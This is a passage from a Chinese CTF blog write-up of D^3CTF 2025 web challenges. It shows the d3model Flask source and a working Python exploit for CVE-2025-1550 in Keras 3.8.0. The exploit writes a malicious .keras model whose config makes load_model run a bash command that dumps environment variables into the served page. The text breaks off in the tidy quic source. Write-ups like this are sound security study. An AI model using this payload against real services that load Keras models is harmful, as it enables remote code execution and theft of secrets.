
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>D^3CTF 2025 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3model"><span class="toc-number">2.</span> <span class="toc-text">d3model</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tidy-quic"><span class="toc-number">3.</span> <span class="toc-text">tidy quic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3invitation%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">d3invitation（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#d3jtar%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">d3jtar（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">6.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3rpg-signin%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">d3rpg-signin（复现）</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>D^3CTF 2025</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/5/30
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">3.2k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">16分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>找不到实习，只能继续打ctf玩玩顺带沉淀了。。</p>
<p>结果过超级端午去了，题没怎么看（</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://gsbp0.github.io/post/d3ctf2025/">https://gsbp0.github.io/post/d3ctf2025/</a></p>
<p>N0wayBack：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/n6fr3KkiGQC_POTMZpYikg">https://mp.weixin.qq.com/s/n6fr3KkiGQC_POTMZpYikg</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247512996&idx=1&sn=ce94e01dfceef60dbf2f055d36a6e770&poc_token=HHFxPWijpXwTfhwmiZATaWyQyQWVPwjpsrRd0gm8">Mini-Venom的wp</a></p>
<p>S1uM4i：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wBdM2PGM3Alz0j31rU_J0w">https://mp.weixin.qq.com/s/wBdM2PGM3Alz0j31rU_J0w</a></p>
<p>Arr3stY0u：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kMbhksbz9lYSW6HvVJ-xwQ">https://mp.weixin.qq.com/s/kMbhksbz9lYSW6HvVJ-xwQ</a></p>
<span id="more"></span>

<hr>
<h1 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> keras
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
<span class="token keyword">import</span> os


<span class="token keyword">def</span> <span class="token function">is_valid_model</span><span class="token punctuation">(</span>modelname<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        keras<span class="token punctuation">.</span>models<span class="token punctuation">.</span>load_model<span class="token punctuation">(</span>modelname<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No file part'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>
    
    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
    
    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No selected file'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>
    
    MAX_FILE_SIZE <span class="token operator">=</span> <span class="token number">50</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment"># 50MB</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>SEEK_END<span class="token punctuation">)</span>
    file_size <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> file_size <span class="token operator">></span> MAX_FILE_SIZE<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'File size exceeds 50MB limit'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>
    
    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'test.keras'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> is_valid_model<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Model is valid'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Invalid model file'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>keras&#x3D;&#x3D;3.8.0</p>
<p>直接去官方 github 仓库看看漏洞：<a target="_blank" rel="noopener" href="https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp">https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp</a></p>
<p>有 CVE-2025-1550，漏洞利用：<a target="_blank" rel="noopener" href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
<p>触发点在 <code>keras.models.load_model</code></p>
<p>测试发现不出网，观察 Dockerfile 发现没有权限变动，意味着可以直接写 index.html</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> json
<span class="token keyword">from</span> keras<span class="token punctuation">.</span>models <span class="token keyword">import</span> Sequential
<span class="token keyword">from</span> keras<span class="token punctuation">.</span>layers <span class="token keyword">import</span> Dense
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

model_name<span class="token operator">=</span><span class="token string">"1.keras"</span>

x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token punctuation">)</span>  
y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> 

model <span class="token operator">=</span> Sequential<span class="token punctuation">(</span><span class="token punctuation">[</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> activation<span class="token operator">=</span><span class="token string">'linear'</span><span class="token punctuation">,</span> input_dim<span class="token operator">=</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>optimizer<span class="token operator">=</span><span class="token string">'adam'</span><span class="token punctuation">,</span> loss<span class="token operator">=</span><span class="token string">'mse'</span><span class="token punctuation">)</span>
model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> epochs<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
model<span class="token punctuation">.</span>save<span class="token punctuation">(</span>model_name<span class="token punctuation">)</span>

<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    config<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"module"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"keras.models"</span>
config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"class_name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Model"</span>
config<span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"layers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"config"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span>
    <span class="token string">"layers"</span><span class="token punctuation">:</span><span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span>
            <span class="token string">"class_name"</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">,</span>
            <span class="token string">"config"</span><span class="token punctuation">:</span><span class="token string">"Popen"</span><span class="token punctuation">,</span>
            <span class="token string">"module"</span><span class="token punctuation">:</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span>
            <span class="token string">"inbound_nodes"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"args"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"env>/app/index.html"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"kwargs"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"bufsize"</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">"input_layers"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">"output_layers"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"mvlttt"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>

<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_read<span class="token punctuation">:</span>
    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"tmp.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>model_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_write<span class="token punctuation">:</span>
        <span class="token keyword">for</span> item <span class="token keyword">in</span> zip_read<span class="token punctuation">.</span>infolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> item<span class="token punctuation">.</span>filename <span class="token operator">!=</span> <span class="token string">"config.json"</span><span class="token punctuation">:</span>
                zip_write<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>item<span class="token punctuation">,</span> zip_read<span class="token punctuation">.</span>read<span class="token punctuation">(</span>item<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>

os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>model_name<span class="token punctuation">)</span>
os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"tmp.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>model_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>model_name<span class="token punctuation">)</span>


<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>model_name<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>
        zf<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">"config.json"</span><span class="token punctuation">,</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Malicious model ready"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传即可触发</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250530230624488.png" alt="image-20250530230624488"></p>
<hr>
<h1 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"errors"</span>
	<span class="token string">"github.com/libp2p/go-buffer-pool"</span>
	<span class="token string">"github.com/quic-go/quic-go/http3"</span>
	<span class="token string">"io"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> p pool<span class="token punctuation">.</span>BufferPool
<span class="token keyword">var</span> ErrWAF <span class="token operator">=</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServeTLS</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span> <span class="token string">"./server.crt"</span><span class="token punctuation">,</span> <span class="token string">"./server.key"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mux<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		err <span class="token operator">:=</span> http3<span class="token punctuation">.</span><span class="token function">ListenAndServeQUIC</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span> <span class="token string">"./server.crt"</span><span class="token punctuation">,</span> <span class="token string">"./server.key"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mux<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">select</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">type</span> mux <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span><span class="token operator">*</span>mux<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> http<span class="token punctuation">.</span>MethodGet <span class="token punctuation">&#123;</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Hello D^3CTF 2025,I'm tidy quic in web."</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">!=</span> http<span class="token punctuation">.</span>MethodPost <span class="token punctuation">&#123;</span>
